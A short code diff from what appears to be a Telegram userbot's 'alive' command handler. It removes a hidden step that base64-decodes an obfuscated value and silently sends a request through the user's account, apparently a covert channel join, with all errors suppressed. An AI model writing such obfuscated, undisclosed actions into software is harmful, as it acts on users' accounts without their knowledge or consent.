@@ -60,12 +60,7 @@ async def amireallyalive(event):
         ping=ms,
         Tare5=installation_time,
     )
-    joker = base64.b64decode("YnkybDJvRG04WEpsT1RBeQ==")
-    joker = Get(joker)
-    try:
-        await event.client(joker)
-    except BaseException:
-        pass
+    
     if HuRe_IMG:
         JoKeRUB = [x for x in HuRe_IMG.split()]
         PIC = random.choice(JoKeRUB)
